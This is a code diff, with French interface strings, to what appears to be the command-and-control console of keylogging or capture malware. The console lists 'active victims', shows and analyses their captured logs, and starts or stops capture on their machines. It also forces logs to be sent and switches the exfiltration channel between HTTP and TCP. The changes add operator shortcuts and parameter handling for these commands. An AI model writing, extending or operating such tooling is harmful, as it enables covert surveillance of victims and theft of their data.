@@ -214,12 +214,18 @@ class Controller:
         Affiche le menu principal
         """
         print("\n" + Fore.CYAN + "Commandes disponibles:" + Style.RESET_ALL)
-        print("  " + Fore.YELLOW + "list" + Style.RESET_ALL + "              - Lister les victimes actives")
-        print("  " + Fore.YELLOW + "logs <id>" + Style.RESET_ALL + "         - Afficher les logs d'une victime")
-        print("  " + Fore.YELLOW + "analyze <id>" + Style.RESET_ALL + "      - Analyser les logs d'une victime")
-        print("  " + Fore.YELLOW + "command <id> <cmd>" + Style.RESET_ALL + " - Envoyer une commande")
-        print("  " + Fore.YELLOW + "help" + Style.RESET_ALL + "              - Afficher ce menu")
-        print("  " + Fore.YELLOW + "exit" + Style.RESET_ALL + "              - Quitter")
+        print("  " + Fore.YELLOW + "list" + Style.RESET_ALL + "                    - Lister les victimes actives")
+        print("  " + Fore.YELLOW + "logs <id> [limit]" + Style.RESET_ALL + "        - Afficher les logs d'une victime")
+        print("  " + Fore.YELLOW + "analyze <id>" + Style.RESET_ALL + "             - Analyser les logs d'une victime")
+        print()
+        print("  " + Fore.YELLOW + "start <id>" + Style.RESET_ALL + "               - Démarrer la capture")
+        print("  " + Fore.YELLOW + "stop <id>" + Style.RESET_ALL + "                - Arrêter la capture")
+        print("  " + Fore.YELLOW + "flush <id>" + Style.RESET_ALL + "               - Envoyer immédiatement les logs")
+        print("  " + Fore.YELLOW + "switch <id> <http|tcp>" + Style.RESET_ALL + "   - Changer le mode d'exfiltration")
+        print("  " + Fore.YELLOW + "command <id> <cmd> [params]" + Style.RESET_ALL + " - Envoyer une commande (format complet)")
+        print()
+        print("  " + Fore.YELLOW + "help" + Style.RESET_ALL + "                    - Afficher ce menu")
+        print("  " + Fore.YELLOW + "exit" + Style.RESET_ALL + "                    - Quitter")
         print()
     
     def run(self):
@@ -274,17 +280,52 @@ class Controller:
                     victim_id = command[1]
                     self.analyze_victim(victim_id)
                 
-                elif cmd == "command":
+                elif cmd == "command" or cmd == "cmd":
                     if len(command) < 3:
-                        self.print_error("Usage: command <victim_id> <command_name>")
-                        self.print_info("Commandes disponibles: start_capture, stop_capture, switch_mode, flush_logs")
+                        self.print_error("Usage: command <victim_id> <command_name> [params]")
+                        self.print_info("Commandes disponibles:")
+                        self.print_info("  - start_capture")
+                        self.print_info("  - stop_capture")
+                        self.print_info("  - switch_mode <http|tcp>")
+                        self.print_info("  - flush_logs")
                         continue
                     
                     victim_id = command[1]
                     command_name = command[2]
-                    params = command[3:] if len(command) > 3 else []
+                    
+                    # Gérer les paramètres selon la commande
+                    params = {}
+                    if command_name == "switch_mode":
+                        if len(command) < 4:
+                            self.print_error("Usage: command <victim_id> switch_mode <http|tcp>")
+                            continue
+                        params = {"mode": command[3]}
                     
                     self.send_command(victim_id, command_name, params)
+                
+                elif cmd == "start":
+                    if len(command) < 2:
+                        self.print_error("Usage: start <victim_id>")
+                        continue
+                    self.send_command(command[1], "start_capture")
+                
+                elif cmd == "stop":
+                    if len(command) < 2:
+                        self.print_error("Usage: stop <victim_id>")
+                        continue
+                    self.send_command(command[1], "stop_capture")
+                
+                elif cmd == "flush":
+                    if len(command) < 2:
+                        self.print_error("Usage: flush <victim_id>")
+                        continue
+                    self.send_command(command[1], "flush_logs")
+                
+                elif cmd == "switch":
+                    if len(command) < 3:
+                        self.print_error("Usage: switch <victim_id> <http|tcp>")
+                        continue
+                    self.send_command(command[1], "switch_mode", {"mode": command[2]})
                 
                 else:
                     self.print_error(f"Commande inconnue: {cmd}")
